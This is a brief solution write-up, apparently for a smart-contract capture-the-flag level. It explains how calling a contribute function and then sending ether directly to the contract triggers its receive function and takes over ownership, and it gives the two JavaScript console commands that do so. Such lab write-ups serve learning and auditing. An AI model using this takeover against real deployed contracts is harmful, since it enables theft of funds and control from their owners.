We can contribute to the contract using the contribute payable function and later perform a transaction to send some ether to the contract and it would trigger the receive payable function and pass the require checks and gain the ownership of the contract.

```
await contract.contribute({value: 1})
await contract.sendTransaction({from: player, value: 1})
```